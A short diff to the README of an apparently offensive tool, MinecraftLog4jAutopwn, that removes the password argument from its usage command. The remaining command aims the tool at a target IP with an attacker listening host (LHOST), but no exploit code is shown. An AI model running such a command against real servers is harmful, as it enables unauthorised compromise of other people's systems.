@@ -26,7 +26,7 @@ git clone https://github.com/yourusername/MinecraftLog4jAutopwn.git
 ## Usage
 
 ```bash
-python MinecraftLog4jAutopwn.py --target <target_IP> --username <minecraft_username> --password <minecraft_password> --LHOST <your_IP>
+python MinecraftLog4jAutopwn.py --target <target_IP> --username <minecraft_username> --LHOST <your_IP>
 ```
 
 ## Command Line Arguments
